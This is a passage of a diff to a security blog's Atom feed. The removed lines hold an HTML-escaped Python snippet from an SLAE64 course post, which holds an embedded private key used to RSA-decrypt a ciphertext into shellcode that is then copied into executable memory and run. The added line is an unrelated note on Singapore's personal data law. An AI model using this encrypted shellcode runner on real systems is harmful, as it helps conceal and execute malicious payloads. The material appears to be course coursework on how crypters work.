-    &lt;span class="c1"&gt;# Copy shellcode from bytes object to executable memory&lt;/span&gt;
-    &lt;span class="n"&gt;exec_mem&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcode_bytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-
-    &lt;span class="c1"&gt;# Cast the memory to a C function object&lt;/span&gt;
-    &lt;span class="n"&gt;ctypes_buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ctypes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c_int&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;from_buffer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;exec_mem&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ctypes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CFUNCTYPE&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;ctypes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c_int64&lt;/span&gt; &lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;ctypes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;addressof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ctypes_buffer&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-    &lt;span class="n"&gt;function&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_avoid_gc_for_mmap&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;exec_mem&lt;/span&gt;
-
-    &lt;span class="c1"&gt;# Return pointer to shell code function in executable memory&lt;/span&gt;
-    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;function&lt;/span&gt;
-
-
-
-
-&lt;span class="n"&gt;private_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;-----BEGIN PRIVATE KEY-----&lt;/span&gt;
-&lt;span class="s2"&gt;MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDjwvXM4jR2RA6v&lt;/span&gt;
-&lt;span class="s2"&gt;+jXFxx9fp7pxKhHI0BJL7prbnpbdIdFLEKSszLGot9ES/0YMo6oOvsKKWB1EGSvY&lt;/span&gt;
-&lt;span class="s2"&gt;JEKS+XufaTB6iw/pykw7Jmyx5pFHrboHYckUmNI5+k2y3K3XhRpJJ2Gb2vw2MhHh&lt;/span&gt;
-&lt;span class="s2"&gt;6VOvfKPRv0BF8sFgOL8vwYPyN21e5AKieqD4ghEfYBOhCTKrYC0l0nm1a25Sw+pJ&lt;/span&gt;
-&lt;span class="s2"&gt;NYmC3Ka4l/1DqFJ9Cr/lK4Un68Gk+z3WtxgdR97QkgJmt08YE8dIL14qfuKPtEon&lt;/span&gt;
-&lt;span class="s2"&gt;JJL31Ui/5tgCmMJCl+t9gPYduY8FM4iPImJMgxeXu+9GDxdx5VEG842iNg1Lfesi&lt;/span&gt;
-&lt;span class="s2"&gt;PAPOViP5AgMBAAECggEBAIj9aE4U+Czx/kuGGPWeMJaeEZujDBNWYsrc9rOFjYPv&lt;/span&gt;
-&lt;span class="s2"&gt;pSybFBEDBRBPjyb39y/++Hfp8KS5HtEouqBEHu67s8lLwWbTYXziujsRf2r5HQSZ&lt;/span&gt;
-&lt;span class="s2"&gt;zzxFamZDDJ7ml/kuljj8y7SYRTMy4WPPdcYFStpQA1BS0dvAiOLQ/t1AbZYwFE5v&lt;/span&gt;
-&lt;span class="s2"&gt;fwvlaDy15fwUGdkM6rDsMKAwiMSSWQ9VW3Z7rLSQAPhO1hR3/pMEuMs/vac0S1AG&lt;/span&gt;
-&lt;span class="s2"&gt;SUNfz/J23dfBJxtKdtrjg/CgylETscnX8E3W8kcb50zYWtwSw+lNaXoVVn65qDDY&lt;/span&gt;
-&lt;span class="s2"&gt;xfMe3g1+jSNF9SN5dg8UOOW9oG/xbUkovlCYpABnZgECgYEA/G9QLO8oC6G8OJM3&lt;/span&gt;
-&lt;span class="s2"&gt;t/2+SNlhYEixW0wpOLxyFAui9XWDEae5P9scWpUYGdS9kgwTtYobE92WhiWrOb6W&lt;/span&gt;
-&lt;span class="s2"&gt;35a8LM1nvgOQO4dWJ9q749VKKpmKzFwT4eelSaXzQH4aw6O+ttkWqvaglUoF5gjV&lt;/span&gt;
-&lt;span class="s2"&gt;5oIUZFFd1QM98bysHbvpiMFbUaECgYEA5vpwocUenkfJguCSmeeir+K0MbhNcyV5&lt;/span&gt;
-&lt;span class="s2"&gt;9MTXs3KYv7d9hKZgZRsmKKDge8nwaCzdVzdQQZgQhxYRM0R6W35QOGYYuQOM1vph&lt;/span&gt;
-&lt;span class="s2"&gt;XgX2JX2BD8d21/2PilrPLiBZ/x1kRephR1BqI3QX4GxEXeRf9A3K+dDBIRTLDckn&lt;/span&gt;
-&lt;span class="s2"&gt;JLdKEqoV41kCgYA2qCtl70pualCEt2uDDQ/cWiT5YgP0zqLGRBc3O+XG2/DLK9Oy&lt;/span&gt;
-&lt;span class="s2"&gt;fdC/1DRps2RwcOj7j7GZNYtX9GQElr24H70Svk7OF5ttKDqBWp0AEbiDTMd+xBkR&lt;/span&gt;
-&lt;span class="s2"&gt;+sQRFDt9JVDKN3QdxxdfYRMX//US/6rAxD2CExQMAS2yX7WsonlIQQVywQKBgHtG&lt;/span&gt;
-&lt;span class="s2"&gt;uwp8DIVpxxFFDrl5uYiqNIY82YlVPSv4Sy+JQCFCq4k6y0PrI4iXpHgtJVRUbaX4&lt;/span&gt;
-&lt;span class="s2"&gt;7aq0oE2Y54E3UR634dTYGOXWETtD0ue9wsvrmhBz4ugQeqXbJax2s9HHPBdcqqLH&lt;/span&gt;
-&lt;span class="s2"&gt;Nn7JnVy4LBz4oIW/Ps/qLMmdMWqgK3YbJTuk752xAoGABkSRTEfy6KtN4o4iAA6s&lt;/span&gt;
-&lt;span class="s2"&gt;yZfzW98/goxCnjORaChrl4guvqmOsvJpfqqIiBKVJ5ITwSw9xcr/M99qWAfC2MpX&lt;/span&gt;
-&lt;span class="s2"&gt;pDR9B3bgmJ+dMhCiCnLU9n7Rzz9tuMCtxXVwzl/0rMCHGh311OEyaMyfZNNPIFmg&lt;/span&gt;
-&lt;span class="s2"&gt;sjhmgtz7iUSwPcWt3gIiMJE=&lt;/span&gt;
-&lt;span class="s2"&gt;-----END PRIVATE KEY-----&lt;/span&gt;
-&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
-
-&lt;span class="n"&gt;ciphertext&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;tGfscW1SL2tEvjlGeA+kq+DjGxb8/xOIxMjp/ZgOnOfHtsxPf11FRIH6ww8xIaQRXzgjDeQURTvESWiTVr5/apINXS+NnN8PzSuOt2baBpsqoB70DWKGNTOjB&lt;/span&gt;
-&lt;span class="n"&gt;T5j2RP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;kN2E&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;xTJ7aclDyqsv6KuOcnmP3yGbFPd4KSGUvWD&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;67&lt;/span&gt;&lt;span class="n"&gt;g1s8AhOrMrX&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;Km73QF4&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;wBCmj1VoPcA&lt;/span&gt;&lt;span class="o"&gt;/+&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;gSoyPMGPw96RG0RDAnQTy&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;Ql9CbJ&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ubtvxqVK5K1cHHg5&lt;/span&gt;
-&lt;span class="n"&gt;GZG7g&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;BhcFK5UpJxZU786NbV5ARdTI8VZICJrV&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;oe8DFG1HlO9Q76o2hdzgrxsDAA&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ZZHPv5j62OnedQtKTTg&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
-
-&lt;span class="n"&gt;private_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;serialization&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;load_pem_private_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
-            &lt;span class="n"&gt;private_key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-            &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-            &lt;span class="n"&gt;backend&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;default_backend&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-        &lt;span class="p"&gt;)&lt;/span&gt;
-
-&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;private_key&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
-        &lt;span class="n"&gt;ciphertext&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;base64&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
-        &lt;span class="n"&gt;padding&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;OAEP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
-            &lt;span class="n"&gt;mgf&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;padding&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MGF1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;algorithm&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;hashes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SHA256&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt;
-            &lt;span class="n"&gt;algorithm&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;hashes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SHA256&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
-            &lt;span class="n"&gt;label&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;None&lt;/span&gt;
-        &lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="p"&gt;)&lt;/span&gt;
-
-&lt;span class="n"&gt;create_shellcode_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;)()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
-
-&lt;p&gt;This blog post has (not) been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:&lt;/p&gt;
-&lt;p&gt;Student ID: SLAE64-XXXXX&lt;/p&gt;</content><category term="articles"/><category term="Security"/></entry></feed>
+&lt;p&gt;Update (27-11-2019) - The government has &lt;a href="https://www.straitstimes.com/tech/all-govt-agencies-to-take-steps-to-safeguard-personal-data-measures-to-be-in-place-in-most?fbclid=IwAR2Z9AgqnVxaeZLdoYDQTMPae2b4IYmapyg1mAIPAJLb7UAy_n03p5Gmof0"&gt;announced&lt;/a&gt; that third-party vendors handling government data who misuse personal data will also come under the Personal Data Protection Act.&lt;/p&gt;</content><category term="articles"/><category term="Security"/><category term="Legal"/></entry></feed>
